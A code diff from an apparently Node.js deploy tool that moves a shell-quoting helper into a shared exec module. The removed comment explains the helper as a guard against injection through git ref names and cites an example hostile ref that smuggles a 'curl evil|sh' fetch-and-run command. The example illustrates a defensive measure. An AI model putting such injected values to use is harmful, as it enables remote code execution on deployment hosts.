@@ -1,6 +1,6 @@
 'use strict';
 
-const { runOnTarget, buildHealthCommand } = require('./exec');
+const { runOnTarget, buildHealthCommand, shQuote } = require('./exec');
 const { lockDir, prevShaFile, acquireLock } = require('./lock');
 const { log: defaultLog } = require('./log');
 const { backupIdFromOutput, backupReferenceFromId } = require('./backup-reference');
@@ -9,18 +9,6 @@ const { resolveBranch } = require('./branch');
 function defaultSleep(seconds) {
   const ms = seconds * 1000;
   Atomics.wait(new Int32Array(new SharedArrayBuffer(4)), 0, 0, ms);
-}
-
-// Single-quote a value for safe interpolation into a remote shell command,
-// escaping an embedded quote with the standard '\'' idiom. config.js already
-// rejects `branch`/`remote` outside a git-refname charset (no shell metacharacters
-// legally survive `git check-ref-format`), but that is a config-layer guard a
-// caller can bypass (`loadConfig({ validate: false })`) — this is the call-site
-// defense-in-depth so an unquoted, attacker-controlled ref (e.g. a target whose
-// `origin/HEAD` was renamed to `master;curl evil|sh`) can never reach the shell
-// unescaped.
-function shQuote(value) {
-  return `'${String(value).replace(/'/g, "'\\''")}'`;
 }
 
 // Path to the host layout marker. A legacy deploy/rollback must refuse to run
